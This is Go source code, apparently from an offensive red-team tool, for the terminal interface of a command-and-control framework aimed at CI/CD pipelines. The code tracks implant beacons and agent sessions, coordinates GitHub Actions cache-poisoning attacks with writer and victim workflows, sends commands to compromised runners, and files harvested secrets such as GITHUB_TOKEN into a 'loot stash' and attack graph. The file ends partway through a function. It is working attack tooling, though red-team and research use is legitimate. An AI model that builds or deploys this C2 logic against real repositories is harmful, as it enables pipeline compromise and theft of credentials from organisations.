// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package tui

import (
	"context"
	"fmt"
	"strings"
	"time"

	tea "charm.land/bubbletea/v2"

	"github.com/boostsecurityio/smokedmeat/internal/counter"
	"github.com/boostsecurityio/smokedmeat/internal/models"
	"github.com/boostsecurityio/smokedmeat/internal/pantry"
	"github.com/boostsecurityio/smokedmeat/internal/rye"
	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
)

func (m Model) handleBeacon(msg BeaconMsg) (tea.Model, tea.Cmd) {
	beacon := msg.Beacon
	callbackMode := strings.TrimSpace(beacon.CallbackMode)
	if callbackMode == "" && m.callbackIDIsResidentFoothold(beacon.CallbackID) {
		callbackMode = agentModeResident
	}
	beacon.CallbackMode = callbackMode

	if cachePoisonWriterMatches("", m.pendingCachePoison, beacon.CallbackID, beacon.AgentID) {
		m.pendingCachePoison.WriterAgentID = beacon.AgentID
	}

	knownSession := false
	for i, s := range m.sessions {
		if s.AgentID != beacon.AgentID {
			continue
		}
		knownSession = true
		m.sessions[i].Hostname = beacon.Hostname
		m.sessions[i].OS = beacon.OS
		m.sessions[i].Arch = beacon.Arch
		m.sessions[i].LastSeen = beacon.Timestamp
		m.sessions[i].IsOnline = true
		break
	}

	if !knownSession {
		m.sessions = append(m.sessions, Session{
			AgentID:  beacon.AgentID,
			Hostname: beacon.Hostname,
			OS:       beacon.OS,
			Arch:     beacon.Arch,
			LastSeen: beacon.Timestamp,
			IsOnline: true,
		})
	}
	m.noteCallbackHit(beacon.CallbackID, beacon.AgentID, beacon.CallbackMode, beacon.Timestamp)
	m.recordCallbackAgent(beacon.CallbackID, beacon.AgentID, beacon.Hostname, beacon.CallbackMode, beacon.Timestamp)
	if m.activeAgent != nil && m.activeAgent.ID == beacon.AgentID {
		m.selectSessionByAgentID(beacon.AgentID)
	}
	if !knownSession {
		m.AddOutput("success", fmt.Sprintf("New agent connected: %s (%s/%s)", beacon.AgentID, beacon.OS, beacon.Arch))
	}

	switch {
	case m.phase == PhaseWaiting && m.waiting != nil:
		switch {
		case m.waiting.CachePoison != nil:
			m.handleCachePoisonBeacon(beacon)
		case beacon.CallbackMode == agentModeResident:
			m.activateWaitingAgentWithMode(beacon.AgentID, beacon.Hostname, beacon.DwellDeadline, beacon.CallbackMode)
		case beacon.CallbackMode != agentModeDwell && m.callbackIsPersistent(beacon.CallbackID):
			if m.waiting.PendingAgents == nil {
				m.waiting.PendingAgents = make(map[string]time.Time)
			}
			m.waiting.PendingAgents[beacon.AgentID] = beacon.Timestamp
		default:
			m.activateWaitingAgentWithMode(beacon.AgentID, beacon.Hostname, beacon.DwellDeadline, beacon.CallbackMode)
		}
	case m.activeAgent == nil && beacon.DwellDeadline != nil && m.restoreDwellAgentAllowed(beacon.AgentID):
		repo, workflow, job := m.sessionContext(beacon.AgentID)
		m.activeAgent = &AgentState{
			ID:        beacon.AgentID,
			Runner:    beacon.Hostname,
			Repo:      repo,
			Workflow:  workflow,
			Job:       job,
			Mode:      agentModeDwell,
			StartTime: time.Now(),
		}
		m.clearDismissedDwellAgent(beacon.AgentID)
		m.selectSessionByAgentID(beacon.AgentID)
		m.jobDeadline = *beacon.DwellDeadline
		m.dwellMode = true
		if m.phase != PhasePostExploit && m.phase != PhasePivot {
			m.TransitionToPhase(PhasePostExploit)
		}
		m.activityLog.Add(IconSuccess, fmt.Sprintf("Restored dwell agent %s", beacon.AgentID[:8]))
	}

	if knownSession {
		return m, m.listenForBeacons()
	}

	historyEntry := counter.HistoryPayload{
		Type:      "agent.connected",
		SessionID: m.config.SessionID,
		AgentID:   beacon.AgentID,
		Outcome:   "success",
	}
	if m.waiting != nil {
		historyEntry.StagerID = m.waiting.StagerID
		historyEntry.VulnID = m.waiting.TargetVuln
		historyEntry.Repository = m.waiting.TargetRepo
	}

	return m, tea.Batch(m.recordHistoryCmd(historyEntry), m.listenForBeacons())
}

func (m *Model) handleCachePoisonBeacon(beacon counter.Beacon) {
	waiting := m.waiting
	if waiting == nil || waiting.CachePoison == nil {
		return
	}
	if waiting.PendingAgents == nil {
		waiting.PendingAgents = make(map[string]time.Time)
	}
	if cachePoisonBeaconIndicatesDwell(beacon) {
		markCachePoisonPendingDwell(waiting.CachePoison, beacon.AgentID)
	}

	switch {
	case beacon.CallbackID == waiting.StagerID || (beacon.CallbackID == "" && waiting.CachePoison.WriterAgentID == ""):
		waiting.CachePoison.WriterAgentID = beacon.AgentID
		waiting.PendingAgents[beacon.AgentID] = beacon.Timestamp
		m.AddOutput("info", fmt.Sprintf("Cache writer callback received: %s", beacon.AgentID))
		m.AddOutput("info", fmt.Sprintf("Waiting for victim workflow %s", waiting.CachePoison.Victim.Workflow))
		m.activityLog.Add(IconInfo, fmt.Sprintf("Cache writer %s connected", beacon.AgentID[:8]))
	case beacon.CallbackID == waiting.CachePoison.VictimStagerID:
		waiting.PendingAgents[beacon.AgentID] = beacon.Timestamp
		if !cachePoisonBeaconIndicatesDwell(beacon) {
			m.AddOutput("info", fmt.Sprintf("Persistent callback hit in express mode: %s", beacon.AgentID))
			m.AddOutput("info", "Arm the next implant with dwell from the implants modal when you want an interactive foothold")
			m.activityLog.Add(IconInfo, fmt.Sprintf("Express victim %s connected", beacon.AgentID[:8]))
			return
		}
		m.activateCachePoisonVictim(beacon.AgentID, beacon.Hostname, beacon.DwellDeadline)
	case waiting.CachePoison.WriterAgentID != "" && beacon.AgentID != waiting.CachePoison.WriterAgentID && waiting.CachePoison.VictimAgentID == "":
		waiting.PendingAgents[beacon.AgentID] = beacon.Timestamp
		if waiting.CachePoison.PendingVictim == beacon.AgentID && cachePoisonBeaconIndicatesDwell(beacon) {
			m.activateCachePoisonVictim(beacon.AgentID, beacon.Hostname, beacon.DwellDeadline)
			return
		}
		m.AddOutput("info", fmt.Sprintf("Unattributed callback received: %s", beacon.AgentID))
	}
}

func cachePoisonBeaconIndicatesDwell(beacon counter.Beacon) bool {
	return beacon.CallbackMode == "dwell"
}

func markCachePoisonPendingDwell(state *CachePoisonWaitingState, agentID string) {
	if state == nil || agentID == "" {
		return
	}
	if state.PendingDwell == nil {
		state.PendingDwell = make(map[string]struct{})
	}
	state.PendingDwell[agentID] = struct{}{}
}

func cachePoisonPendingDwell(state *CachePoisonWaitingState, agentID string) bool {
	if state == nil || agentID == "" || state.PendingDwell == nil {
		return false
	}
	_, ok := state.PendingDwell[agentID]
	return ok
}

func cachePoisonVictimMatchesExpressData(waiting *WaitingState, data counter.ExpressDataPayload) bool {
	if waiting == nil || waiting.CachePoison == nil || waiting.CachePoison.VictimAgentID != "" {
		return false
	}
	if waiting.CachePoison.WriterAgentID != "" && data.AgentID == waiting.CachePoison.WriterAgentID {
		return false
	}
	if data.CallbackID != "" {
		return data.CallbackID == waiting.CachePoison.VictimStagerID
	}

	repo, workflow, job := cachePoisonVictimTarget(waiting)
	matched := false
	if repo != "" {
		if data.Repository == "" || data.Repository != repo {
			return false
		}
		matched = true
	}
	if workflow != "" {
		if data.Workflow == "" || data.Workflow != workflow {
			return false
		}
		matched = true
	}
	if job != "" {
		if data.Job == "" || data.Job != job {
			return false
		}
		matched = true
	}
	if !matched {
		return false
	}
	return true
}

func (m *Model) activateCachePoisonVictim(agentID, hostname string, dwellDeadline *time.Time) {
	waiting := m.waiting
	if waiting == nil || waiting.CachePoison == nil {
		return
	}
	waiting.CachePoison.VictimAgentID = agentID
	repo, workflow, job := cachePoisonVictimTarget(waiting)
	m.activeAgent = &AgentState{
		ID:        agentID,
		Runner:    hostname,
		Repo:      repo,
		Workflow:  workflow,
		Job:       job,
		Mode:      m.normalizeActiveAgentMode(agentModeDwell, dwellDeadline, waiting.DwellTime),
		EntryVuln: waiting.TargetVuln,
		StartTime: time.Now(),
	}
	m.clearDismissedDwellAgent(agentID)
	m.selectSessionByAgentID(agentID)
	m.setActiveAgentTiming(m.activeAgent.Mode, dwellDeadline, waiting.DwellTime)
	m.TransitionToPhase(PhasePostExploit)
	m.waiting = nil
	m.activityLog.Add(IconSuccess, fmt.Sprintf("Cache victim %s connected - entering post-exploit phase", agentID[:8]))
}

func cachePoisonWriterMatches(waitingStagerID string, state *CachePoisonWaitingState, callbackID, agentID string) bool {
	if state == nil {
		return false
	}
	if callbackID != "" {
		return callbackID == waitingStagerID || callbackID == state.WriterStagerID
	}
	return state.WriterAgentID != "" && agentID == state.WriterAgentID
}

func assignCachePoisonWriterStatus(state *CachePoisonWaitingState, status *models.CachePoisonStatus, agentID string) {
	if state == nil || status == nil {
		return
	}
	copyStatus := *status
	state.WriterStatus = &copyStatus
	if state.WriterAgentID == "" && agentID != "" {
		state.WriterAgentID = agentID
	}
}

func cachePoisonVictimTarget(waiting *WaitingState) (repo, workflow, job string) {
	repo = waiting.CachePoison.Victim.Repository
	if repo == "" {
		repo = waiting.TargetRepo
	}
	workflow = waiting.CachePoison.Victim.Workflow
	if workflow == "" {
		workflow = waiting.TargetWorkflow
	}
	job = waiting.CachePoison.Victim.Job
	if job == "" {
		job = waiting.TargetJob
	}
	return
}

func (m *Model) activateWaitingAgentWithMode(agentID, hostname string, dwellDeadline *time.Time, callbackMode string) {
	waiting := m.waiting
	if waiting == nil {
		return
	}
	m.activeAgent = &AgentState{
		ID:        agentID,
		Runner:    hostname,
		Repo:      waiting.TargetRepo,
		Workflow:  waiting.TargetWorkflow,
		Job:       waiting.TargetJob,
		Mode:      m.normalizeActiveAgentMode(callbackMode, dwellDeadline, waiting.DwellTime),
		EntryVuln: waiting.TargetVuln,
		StartTime: time.Now(),
	}
	m.clearDismissedDwellAgent(agentID)
	m.selectSessionByAgentID(agentID)
	m.setActiveAgentTiming(m.activeAgent.Mode, dwellDeadline, waiting.DwellTime)
	m.TransitionToPhase(PhasePostExploit)
	m.waiting = nil
	m.activityLog.Add(IconSuccess, fmt.Sprintf("Agent %s connected - entering post-exploit phase", agentID[:8]))
}

func waitingMatchesExpressData(waiting *WaitingState, data counter.ExpressDataPayload) bool {
	if waiting == nil || waiting.CachePoison != nil {
		return false
	}
	if waiting.StagerID == "" || data.CallbackID == "" {
		return false
	}
	return data.CallbackID == waiting.StagerID
}

func (m *Model) setActiveAgentTiming(mode string, deadline *time.Time, fallback time.Duration) {
	if strings.TrimSpace(mode) == agentModeResident {
		m.jobDeadline = time.Time{}
		m.dwellMode = true
		return
	}
	switch {
	case deadline != nil:
		m.jobDeadline = *deadline
		m.dwellMode = true
	case fallback > 0:
		m.jobDeadline = time.Now().Add(fallback)
		m.dwellMode = true
	default:
		m.dwellMode = false
		m.jobDeadline = time.Time{}
	}
}

func (m *Model) normalizeActiveAgentMode(callbackMode string, deadline *time.Time, fallback time.Duration) string {
	switch strings.TrimSpace(callbackMode) {
	case agentModeResident:
		return agentModeResident
	case agentModeDwell:
		return agentModeDwell
	case agentModeExpress:
		return agentModeExpress
	}
	switch {
	case deadline != nil:
		return agentModeDwell
	case fallback > 0:
		return agentModeDwell
	default:
		return agentModeExpress
	}
}

func (m Model) handleColeslaw(msg ColeslawMsg) (tea.Model, tea.Cmd) {
	coleslaw := msg.Coleslaw

	m.AddOutput("info", fmt.Sprintf("Response from %s (order %s):", coleslaw.AgentID, coleslaw.OrderID[:8]))

	stdoutBytes, _ := coleslaw.GetStdout()
	stdout := string(stdoutBytes)

	if reconResult, err := models.UnmarshalReconResult(stdoutBytes); err == nil && reconResult.AgentID != "" {
		m.handleReconResult(reconResult)
		return m, m.listenForColeslaw()
	}

	if scanResult, err := models.UnmarshalScanResult(stdoutBytes); err == nil && scanResult.Path != "" {
		m.handleScanResult(scanResult)
		return m, m.listenForColeslaw()
	}

	if qr, err := models.UnmarshalCloudQueryResult(stdoutBytes); err == nil && qr.QueryType != "" {
		m.handleCloudQueryResult(qr)
		return m, m.listenForColeslaw()
	}

	if pivotResult, err := models.UnmarshalPivotResult(stdoutBytes); err == nil && pivotResult.Provider != "" {
		m.handlePivotResult(pivotResult)
		return m, m.listenForColeslaw()
	}

	if stdout != "" {
		for _, line := range strings.Split(stdout, "\n") {
			if line != "" {
				m.AddOutput("output", line)
			}
		}
	}

	stderrBytes, _ := coleslaw.GetStderr()
	stderr := string(stderrBytes)
	if stderr != "" {
		for _, line := range strings.Split(stderr, "\n") {
			if line != "" {
				m.AddOutput("error", line)
			}
		}
	}

	if coleslaw.ExitCode != 0 {
		m.AddOutput("warning", fmt.Sprintf("Exit code: %d", coleslaw.ExitCode))
	}

	return m, m.listenForColeslaw()
}

func (m Model) handleExpressData(msg ExpressDataMsg) (tea.Model, tea.Cmd) {
	data := msg.Data
	m.recordCallbackAgent(data.CallbackID, data.AgentID, data.Hostname, data.CallbackMode, data.Timestamp)
	m.recordCallbackSecrets(data.CallbackID, data.AgentID, len(data.Secrets))
	agentShort := data.AgentID
	if len(agentShort) > 8 {
		agentShort = data.AgentID[:8]
	}
	source := fmt.Sprintf("agent:%s", agentShort)
	if data.ResidentJob != nil {
		source = fmt.Sprintf("resident:%s:%s", agentShort, data.ResidentJob.SignalSource)
	}

	repo := data.Repository
	workflow := data.Workflow
	job := data.Job
	if data.ResidentJob != nil {
		if data.ResidentJob.Repository != "" {
			repo = data.ResidentJob.Repository
		}
		if data.ResidentJob.Workflow != "" {
			workflow = data.ResidentJob.Workflow
		}
		if data.ResidentJob.Job != "" {
			job = data.ResidentJob.Job
		}
		m.noteResidentJob(data.AgentID, data.Hostname, data.ResidentJob)
	}
	if repo == "" {
		repo = m.target
		if m.waiting != nil && m.waiting.TargetRepo != "" {
			repo = m.waiting.TargetRepo
		} else if m.activeAgent != nil && m.activeAgent.Repo != "" {
			repo = m.activeAgent.Repo
		}
	}
	if workflow == "" {
		if m.waiting != nil {
			workflow = m.waiting.TargetWorkflow
		} else if m.activeAgent != nil {
			workflow = m.activeAgent.Workflow
		}
	}
	if job == "" {
		if m.waiting != nil {
			job = m.waiting.TargetJob
		} else if m.activeAgent != nil {
			job = m.activeAgent.Job
		}
	}
	m.updateSessionContext(data.AgentID, repo, workflow, job)
	if m.activeAgent != nil && m.activeAgent.ID == data.AgentID {
		if repo != "" {
			m.activeAgent.Repo = repo
		}
		if workflow != "" {
			m.activeAgent.Workflow = workflow
		}
		if job != "" {
			m.activeAgent.Job = job
		}
	}

	for _, es := range data.Secrets {
		secretRepo := repo
		if es.Repository != "" {
			secretRepo = es.Repository
		}
		secretWorkflow := workflow
		if es.Workflow != "" {
			secretWorkflow = es.Workflow
		}
		secretJob := job
		if es.Job != "" {
			secretJob = es.Job
		}
		ephemeral := !es.HighValue || isEphemeralSecretName(es.Name)
		secret := CollectedSecret{
			Name:        es.Name,
			Value:       es.Value,
			Source:      source + ":" + es.Source,
			Ephemeral:   ephemeral,
			CollectedAt: data.Timestamp,
			Type:        es.Type,
			Repository:  secretRepo,
			Workflow:    secretWorkflow,
			Job:         secretJob,
			AgentID:     agentShort,
			ExpressMode: ephemeral,
		}
		if structuralType, ok := m.workflowSecretTypes[es.Name]; ok {
			secret.Type = structuralType
		}
		if secret.IsEphemeral() && secretRepo != "" {
			secret.BoundToRepo = secretRepo
		}
		if secret.IsEphemeral() && secret.ExpressMode {
			m.AddToSessionLoot(secret)
		} else {
			m.AddToLootStash(secret)
		}
		if secret.Name == "GITHUB_TOKEN" || secret.Type == "github_token" {
			m.storeTokenDisplayPermissions(secret, data.TokenPermissions)
		}
	}

	m.pairGitHubAppCredentials()

	if m.pantry != nil {
		extractedNames := make(map[string]struct{}, len(data.Secrets))
		for _, es := range data.Secrets {
			extractedNames[es.Name] = struct{}{}
		}
		for _, secret := range m.pantry.FindSecrets() {
			if _, ok := extractedNames[secret.Name]; ok && secret.State != pantry.StateExploited {
				_ = m.pantry.UpdateAssetState(secret.ID, pantry.StateExploited)
			}
		}
	}

	if len(data.TokenPermissions) > 0 {
		if m.tokenPermissions == nil {
			m.tokenPermissions = make(map[string]string)
		}
		for k, v := range data.TokenPermissions {
			m.tokenPermissions[k] = v
		}
	}

	if len(data.Vars) > 0 {
		if m.runnerVars == nil {
			m.runnerVars = make(map[string]string)
		}
		for k, v := range data.Vars {
			m.runnerVars[k] = v
		}
	}

	if data.CachePoison != nil {
		if m.waiting != nil && m.waiting.CachePoison != nil &&
			(cachePoisonWriterMatches(m.waiting.StagerID, m.waiting.CachePoison, data.CallbackID, data.AgentID) || m.waiting.CachePoison.VictimAgentID == "") {
			assignCachePoisonWriterStatus(m.waiting.CachePoison, data.CachePoison, data.AgentID)
		}
		if m.pendingCachePoison != nil &&
			(cachePoisonWriterMatches("", m.pendingCachePoison, data.CallbackID, data.AgentID) || m.pendingCachePoison.WriterStatus == nil) {
			assignCachePoisonWriterStatus(m.pendingCachePoison, data.CachePoison, data.AgentID)
		}
		switch strings.TrimSpace(data.CachePoison.Status) {
		case "armed":
			msg := "Cache poison armed"
			key := strings.TrimSpace(data.CachePoison.Key)
			if key != "" {
				msg = fmt.Sprintf("Cache poison armed: %s", key)
			}
			m.activityLog.Add(IconSuccess, msg)
			m.AddOutput("success", msg)
		case "failed":
			msg := "Cache poison failed"
			if detail := strings.TrimSpace(data.CachePoison.Error); detail != "" {
				msg = fmt.Sprintf("Cache poison failed: %s", detail)
			}
			m.activityLog.Add(IconError, msg)
			m.AddOutput("error", msg)
		}
	}

	if cachePoisonVictimMatchesExpressData(m.waiting, data) {
		if m.waiting.PendingAgents == nil {
			m.waiting.PendingAgents = make(map[string]time.Time)
		}
		m.waiting.PendingAgents[data.AgentID] = data.Timestamp
		if data.CallbackMode == "dwell" || cachePoisonPendingDwell(m.waiting.CachePoison, data.AgentID) {
			m.activateCachePoisonVictim(data.AgentID, data.Hostname, nil)
		} else {
			m.waiting.CachePoison.PendingVictim = data.AgentID
			m.AddOutput("info", fmt.Sprintf("Persistent callback hit in express mode: %s", data.AgentID))
			m.AddOutput("info", "Arm the next implant with dwell from the implants modal when you want an interactive foothold")
			m.activityLog.Add(IconInfo, fmt.Sprintf("Express victim %s connected", agentShort))
		}
	}

	if waitingMatchesExpressData(m.waiting, data) {
		if m.waiting.PendingAgents == nil {
			m.waiting.PendingAgents = make(map[string]time.Time)
		}
		m.waiting.PendingAgents[data.AgentID] = data.Timestamp
		switch {
		case data.CallbackMode == "resident":
			m.activateWaitingAgentWithMode(data.AgentID, data.Hostname, nil, data.CallbackMode)
		case data.CallbackMode == "dwell":
			m.activateWaitingAgentWithMode(data.AgentID, data.Hostname, nil, data.CallbackMode)
		case m.callbackIsPersistent(data.CallbackID):
			if m.callbackIDIsResidentFoothold(data.CallbackID) {
				m.AddOutput("info", fmt.Sprintf("Resident foothold seed hit in express mode: %s", data.AgentID))
				m.AddOutput("info", "Waiting for the resident beacon to come back on the same foothold")
			} else {
				m.AddOutput("info", fmt.Sprintf("Persistent callback hit in express mode: %s", data.AgentID))
				m.AddOutput("info", "Arm the next implant with dwell from the implants modal when you want an interactive foothold")
			}
			m.activityLog.Add(IconInfo, fmt.Sprintf("Express callback %s connected", agentShort))
		}
	}

	varInfo := ""
	if len(data.Vars) > 0 {
		varInfo = fmt.Sprintf(", %d vars", len(data.Vars))
	}
	if data.ResidentJob != nil {
		m.activityLog.AddEntry(ActivityEntry{
			Timestamp: data.Timestamp,
			Icon:      IconSuccess,
			Message:   fmt.Sprintf("Resident harvest: %d secrets%s captured from %s", len(data.Secrets), varInfo, data.Hostname),
		})
		m.AddOutput("success", fmt.Sprintf("Resident job harvest: %d secrets%s from %s", len(data.Secrets), varInfo, agentShort))
		return m, m.listenForExpressData()
	}
	m.activityLog.AddEntry(ActivityEntry{
		Timestamp: data.Timestamp,
		Icon:      IconSuccess,
		Message:   fmt.Sprintf("Loot: %d secrets%s captured from %s", len(data.Secrets), varInfo, data.Hostname),
	})
	m.AddOutput("success", fmt.Sprintf("Express data received: %d secrets%s from %s", len(data.Secrets), varInfo, agentShort))

	return m, m.listenForExpressData()
}

func (m *Model) noteResidentHistory(entry HistoryEntry) {
	if !strings.HasPrefix(entry.Type, "resident_job.") {
		return
	}
	observed := &models.ResidentJobObservation{
		Event:                 strings.TrimPrefix(entry.Type, "resident_job."),
		SignalSource:          entry.SignalSource,
		Repository:            entry.Repository,
		Workflow:              entry.Workflow,
		Job:                   entry.Job,
		RunID:                 entry.RunID,
		AttributionConfidence: entry.AttributionConfidence,
		HarvestProfile:        entry.HarvestProfile,
		Error:                 entry.ErrorDetail,
	}
	switch entry.Type {
	case "resident_job.observed":
		observed.Event = models.ResidentJobEventObserved
		observed.ObservedAt = entry.Timestamp
	case "resident_job.harvested":
		observed.Event = models.ResidentJobEventHarvested
		observed.HarvestedAt = entry.Timestamp
	case "resident_job.harvest_failed":
		observed.Event = models.ResidentJobEventHarvestFailed
		observed.HarvestedAt = entry.Timestamp
	}
	m.noteResidentJob(entry.AgentID, "", observed)
}

func (m *Model) noteResidentJob(agentID, hostname string, observed *models.ResidentJobObservation) {
	if observed == nil || strings.TrimSpace(agentID) == "" {
		return
	}
	if m.activeAgent == nil || m.activeAgent.ID != agentID {
		return
	}
	switch observed.Event {
	case models.ResidentJobEventObserved:
		m.activeAgent.ResidentWatchStatus = "observed"
		if !observed.ObservedAt.IsZero() {
			m.activeAgent.ResidentLastObserved = observed.ObservedAt
		}
	case models.ResidentJobEventHarvested:
		m.activeAgent.ResidentWatchStatus = "harvested"
		if !observed.HarvestedAt.IsZero() {
			m.activeAgent.ResidentLastHarvested = observed.HarvestedAt
		}
		m.activeAgent.ResidentLastHarvestError = ""
	case models.ResidentJobEventHarvestFailed:
		m.activeAgent.ResidentWatchStatus = "failed"
		if !observed.HarvestedAt.IsZero() {
			m.activeAgent.ResidentLastHarvested = observed.HarvestedAt
		}
		m.activeAgent.ResidentLastHarvestError = observed.Error
	}
	if hostname != "" {
		m.activeAgent.Runner = hostname
	}
	if observed.SignalSource != "" {
		m.activeAgent.ResidentSignalSource = observed.SignalSource
	}
	if observed.AttributionConfidence != "" {
		m.activeAgent.ResidentLastConfidence = observed.AttributionConfidence
	}
	if observed.RunID != "" {
		m.activeAgent.ResidentLastRunID = observed.RunID
	}
	if observed.Repository != "" {
		m.activeAgent.ResidentLastRepository = observed.Repository
	}
	if observed.Workflow != "" {
		m.activeAgent.ResidentLastWorkflow = observed.Workflow
	}
	if observed.Job != "" {
		m.activeAgent.ResidentLastJob = observed.Job
	}
}

func (m *Model) handleReconResult(recon *models.ReconResult) {
	m.AddOutput("success", fmt.Sprintf("Recon complete: %s on %s", recon.AgentID, recon.Platform))

	if recon.Repository != nil && recon.Repository.FullName != "" {
		m.AddOutput("info", fmt.Sprintf("  Repository: %s", recon.Repository.FullName))
	}

	if recon.Workflow != nil && recon.Workflow.Name != "" {
		m.AddOutput("info", fmt.Sprintf("  Workflow: %s (job: %s)", recon.Workflow.Name, recon.Workflow.Job))
		if recon.Workflow.Event != "" {
			m.AddOutput("info", fmt.Sprintf("  Trigger: %s by %s", recon.Workflow.Event, recon.Workflow.Actor))
		}
	}

	if recon.Runner != nil {
		runnerType := "hosted"
		if recon.Runner.SelfHosted {
			runnerType = "SELF-HOSTED"
		}
		m.AddOutput("info", fmt.Sprintf("  Runner: %s (%s/%s) [%s]",
			recon.Runner.Name, recon.Runner.OS, recon.Runner.Arch, runnerType))
	}

	if recon.OIDC != nil && recon.OIDC.Available {
		m.AddOutput("warning", "  OIDC: AVAILABLE (cloud pivot possible)")
	}

	if len(recon.Secrets) > 0 {
		highValue := recon.HighValueSecretCount()
		m.AddOutput("success", fmt.Sprintf("  Secrets: %d found (%d high-value)", len(recon.Secrets), highValue))

		source := ""
		if recon.Repository != nil && recon.Workflow != nil {
			source = fmt.Sprintf("%s/%s", recon.Repository.FullName, recon.Workflow.Name)
		} else if recon.Repository != nil {
			source = recon.Repository.FullName
		}

		lootCount := 0
		for _, secret := range recon.Secrets {
			marker := ""
			if secret.HighValue {
				marker = " [HIGH-VALUE]"
			}
			m.AddOutput("info", fmt.Sprintf("    - %s (%s, %d chars)%s",
				secret.Name, secret.Type, secret.Length, marker))

			collected := CollectedSecret{
				Name:        secret.Name,
				Source:      source,
				Ephemeral:   isEphemeralSecretName(secret.Name),
				Scopes:      scopesForSecretType(secret.Type),
				CollectedAt: time.Now(),
			}
			m.AddToLootStash(collected)
			if collected.Name == "GITHUB_TOKEN" {
				m.storeTokenDisplayPermissions(collected, recon.TokenPermissions)
			}
			lootCount++
		}

		if lootCount > 0 {
			m.activityLog.Add(IconSecret, fmt.Sprintf("Extracted %d secrets to loot", lootCount))
		}
	} else {
		m.AddOutput("info", "  Secrets: none detected")
	}

	if recon.Network != nil {
		internetStatus := "blocked"
		if recon.Network.CanReachInternet {
			internetStatus = "available"
		}
		m.AddOutput("info", fmt.Sprintf("  Network: internet %s, proxy: %v",
			internetStatus, recon.Network.ProxyConfigured))
	}

	imported, err := m.importReconToPantry(recon)
	if err != nil {
		m.AddOutput("error", fmt.Sprintf("  Pantry import failed: %v", err))
	} else {
		m.AddOutput("success", fmt.Sprintf("  Imported %d assets to attack graph", imported))
	}
}

func (m *Model) handleScanResult(scan *models.ScanResult) {
	if scan.Success {
		m.AddOutput("success", fmt.Sprintf("Scan complete: %s", scan.Path))
	} else {
		m.AddOutput("error", fmt.Sprintf("Scan failed: %s", scan.Path))
		for _, e := range scan.Errors {
			m.AddOutput("error", fmt.Sprintf("  %s", e))
		}
		return
	}

	if scan.Repository != "" {
		m.AddOutput("info", fmt.Sprintf("  Repository: %s", scan.Repository))
	}

	if scan.TotalFindings == 0 {
		m.AddOutput("info", "  No offensive vulnerabilities found")
		return
	}

	m.AddOutput("warning", fmt.Sprintf("  Found %d vulnerabilities:", scan.TotalFindings))
	if scan.CriticalFindings > 0 {
		m.AddOutput("error", fmt.Sprintf("    Critical: %d", scan.CriticalFindings))
	}
	if scan.HighFindings > 0 {
		m.AddOutput("warning", fmt.Sprintf("    High: %d", scan.HighFindings))
	}
	if scan.MediumFindings > 0 {
		m.AddOutput("info", fmt.Sprintf("    Medium: %d", scan.MediumFindings))
	}
	if scan.LowFindings > 0 {
		m.AddOutput("info", fmt.Sprintf("    Low: %d", scan.LowFindings))
	}

	for _, f := range scan.Findings {
		var severity string
		switch f.Severity {
		case "error":
			severity = "CRITICAL"
		case "warning":
			severity = "HIGH"
		default:
			severity = f.Severity
		}
		m.AddOutput("info", fmt.Sprintf("  [%s] %s", severity, f.Title))
		location := fmt.Sprintf("    %s", f.Path)
		if f.Line > 0 {
			location = fmt.Sprintf("%s:%d", location, f.Line)
		}
		m.AddOutput("info", location)
		if f.Job != "" {
			jobInfo := fmt.Sprintf("    Job: %s", f.Job)
			if f.Step != "" {
				jobInfo = fmt.Sprintf("%s → Step: %s", jobInfo, f.Step)
			}
			m.AddOutput("info", jobInfo)
		}
	}

	imported, err := m.importScanToPantry(scan)
	if err != nil {
		m.AddOutput("error", fmt.Sprintf("  Pantry import failed: %v", err))
	} else if imported > 0 {
		m.AddOutput("success", fmt.Sprintf("  Imported %d vulnerabilities to attack graph", imported))
	}
}

func (m Model) sendOrder(command string, args []string) tea.Cmd {
	return func() tea.Msg {
		session := m.SelectedSession()
		if session == nil {
			return OrderFailedMsg{OrderID: "", Err: fmt.Errorf("no session selected")}
		}

		order := models.NewOrder(m.config.SessionID, session.AgentID, command, args)

		if m.kitchenClient == nil {
			return OrderFailedMsg{OrderID: order.OrderID, Err: fmt.Errorf("not connected to Kitchen")}
		}

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		if err := m.kitchenClient.PublishOrder(ctx, order); err != nil {
			return OrderFailedMsg{OrderID: order.OrderID, Err: err}
		}
		return OrderSentMsg{OrderID: order.OrderID, AgentID: session.AgentID}
	}
}

func (m Model) handleSetCommand(key, value string) (tea.Model, tea.Cmd) {
	switch key {
	case "target":
		m.setTargetValue(value, "command")

	case "kitchen":
		m.config.KitchenURL = value
		m.lightRye = rye.NewLightRye(value)
		m.AddOutput("success", "Kitchen URL set: "+value)

	case "activity-log", "activity":
		fields := strings.Fields(strings.ToLower(value))
		if len(fields) == 0 {
			m.AddOutput("error", "Usage: set activity-log autoexpand on|off")
			return m, nil
		}
		switch {
		case len(fields) == 1 && (fields[0] == "on" || fields[0] == "off"):
			m.activityLogAutoExpand = fields[0] == "on"
		case len(fields) == 2 && fields[0] == "autoexpand" && (fields[1] == "on" || fields[1] == "off"):
			m.activityLogAutoExpand = fields[1] == "on"
		default:
			m.AddOutput("error", "Usage: set activity-log autoexpand on|off")
			return m, nil
		}
		if !m.activityLogAutoExpand {
			m.activityLogExpandedUntil = time.Time{}
		}
		state := "off"
		if m.activityLogAutoExpand {
			state = "on"
		}
		m.AddOutput("success", "Activity log auto-expand: "+state)

	default:
		m.AddOutput("error", "Unknown setting: "+key)
		m.AddOutput("info", "Valid settings: token, target, kitchen, activity-log")
	}

	m.updatePlaceholder()
	return m, nil
}

func normalizeTargetValue(value string) (target, targetType, spec string) {
	trimmed := strings.TrimSpace(value)
	switch {
	case strings.HasPrefix(trimmed, "org:"):
		targetType = "org"
		target = strings.TrimPrefix(trimmed, "org:")
	case strings.HasPrefix(trimmed, "repo:"):
		targetType = "repo"
		target = strings.TrimPrefix(trimmed, "repo:")
	case strings.Contains(trimmed, "/"):
		targetType = "repo"
		target = trimmed
	default:
		targetType = "org"
		target = trimmed
	}
	spec = targetType + ":" + target
	return target, targetType, spec
}

func (m Model) currentTargetSpec() string {
	if strings.TrimSpace(m.target) == "" {
		return ""
	}
	targetType := m.targetType
	if targetType == "" {
		targetType = "org"
	}
	return targetType + ":" + strings.TrimSpace(m.target)
}

func (m *Model) setTargetValue(value, origin string) {
	target, targetType, spec := normalizeTargetValue(value)
	prevSpec := m.currentTargetSpec()

	m.target = target
	m.targetType = targetType
	m.analysisFocusRepo = ""

	switch prevSpec {
